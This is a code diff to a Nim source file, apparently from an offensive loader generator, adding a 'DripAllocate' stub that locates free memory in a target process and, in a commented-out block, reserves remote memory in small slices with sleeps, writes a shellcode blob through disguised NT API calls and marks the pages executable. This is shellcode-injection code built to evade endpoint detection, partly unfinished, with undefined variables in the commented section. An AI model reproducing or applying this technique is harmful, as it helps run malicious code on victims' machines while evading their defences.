@@ -139,6 +139,142 @@ proc restoreBytes(hProc: HANDLE, addressToHook: LPVOID): bool =
 
     return output
 
+"""
+
+let DripAllocateStub * = """
+
+const VC_PREF_BASES: seq[pointer] = @[cast[pointer](0x00000000DDDD0000),
+    cast[pointer](0x0000000010000000),
+    cast[pointer](0x0000000021000000),
+    cast[pointer](0x0000000032000000),
+    cast[pointer](0x0000000043000000),
+    cast[pointer](0x0000000050000000),
+    cast[pointer](0x0000000041000000),
+    cast[pointer](0x0000000042000000),
+    cast[pointer](0x0000000040000000),
+    cast[pointer](0x0000000022000000)]
+
+proc GetSuitableBaseAddress(hProc: HANDLE, szPage: DWORD, szAllocGran: DWORD, cVmResv: DWORD): LPVOID =
+    var mbi: MEMORY_BASIC_INFORMATION
+
+    for base in VC_PREF_BASES:
+        echo "Calling VirtualQueryEx for address ", repr(base), " with size ", sizeof(mbi).SIZE_T
+        VirtualQueryEx(hProc, cast[LPVOID](base), addr mbi, sizeof(mbi).SIZE_T)
+        echo "GetLastError: ", GetLastError()
+        if mbi.State == MEM_FREE:
+            var i: DWORD = 0
+            while i < cVmResv:
+                let currentBase = cast[LPVOID](cast[DWORD_PTR](base) + i * szAllocGran)
+                echo "Checking CurrentBase: ", repr(currentBase)
+                echo "Moar VirtualQueryEx"
+                VirtualQueryEx(hProc, currentBase, addr mbi, sizeof(mbi).SIZE_T)
+                i += 1
+                if mbi.State != MEM_FREE:
+                    echo "Mem not free"
+                    break
+                else:
+                    echo "Mem free"
+            if i == cVmResv:
+                # found suitable base
+                return cast[LPVOID](base)
+
+    result = nil
+
+proc DripAllocate(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: SIZE_T, Protect: ULONG): bool =
+    var sys_inf: SYSTEM_INFO
+    echo "Getting Infos"
+    GetSystemInfo(addr sys_inf)
+    echo "Got Infos"
+    var page_size: DWORD = sys_inf.dwPageSize
+    var alloc_gran: DWORD = sys_inf.dwAllocationGranularity
+
+    if page_size == 0:
+        page_size = 0x1000
+
+    if alloc_gran == 0:
+        alloc_gran = 0x10000
+    
+    var cVmResv: DWORD = DWORD((DWORD(RegionSize) / alloc_gran) + 1)
+    echo "Going to allocate for ", cVmResv, " times"
+    echo "Allocation Granularity: ", alloc_gran
+    var vmBaseAddress: LPVOID = GetSuitableBaseAddress(ProcessHandle, page_size, alloc_gran, cVmResv)
+
+    if vmBaseAddress == nil:
+        return false
+    else:
+        return true
+    #[
+    var status: NTSTATUS = 0
+    var cmm_i: DWORD
+    var currentVmBase: LPVOID = cast[LPVOID](vmBaseAddress)
+
+    var vcVmResv: seq[LPVOID] = @[]
+
+    # Reserve enough memory
+    var i: DWORD
+    for i in 1..cVmResv:
+        Sleep(1)
+
+        status = ANtAVM(
+            hProc,
+            addr currentVmBase,
+            nil,
+            addr szVmResv,
+            MEM_RESERVE,
+            PAGE_NOACCESS
+        )
+
+        if status == STATUS_SUCCESS:
+            vcVmResv.add(currentVmBase)
+        else:
+            return 4
+
+        currentVmBase = cast[LPVOID](cast[DWORD_PTR](currentVmBase) + szVmResv)
+
+    var offsetSc: DWORD = 0
+    var oldProt: DWORD
+
+    # Loop over the pages and commit our sc blob in 4kB slices
+    var prcDone: float = 0.0
+    for i in 0..<cVmResv:
+        for cmm_i in 0..<cVmCmm:
+            prcDone += 1.0 / (cVmResv * cVmCmm)
+
+            let offset = cmm_i * szVmCmm
+            currentVmBase = cast[LPVOID](cast[DWORD_PTR](vcVmResv[i]) + offset)
+
+            status = ANtAVM(
+                hProc,
+                addr currentVmBase,
+                nil,
+                addr szVmCmm,
+                MEM_COMMIT,
+                PAGE_READWRITE
+                )
+
+            Sleep(1)
+
+            var szWritten: SIZE_T = 0
+
+            status = ANtWVM(
+                hProc,
+                currentVmBase,
+                addr shellcode[offsetSc],
+                szVmCmm,
+                addr szWritten
+                )
+
+            Sleep(1)
+
+            offsetSc += szVmCmm
+
+            status = ANtPVM(
+                hProc,
+                addr currentVmBase,
+                addr szVmCmm,
+                PAGE_EXECUTE_READ,
+                addr oldProt
+                ) ]#
 
 """
 
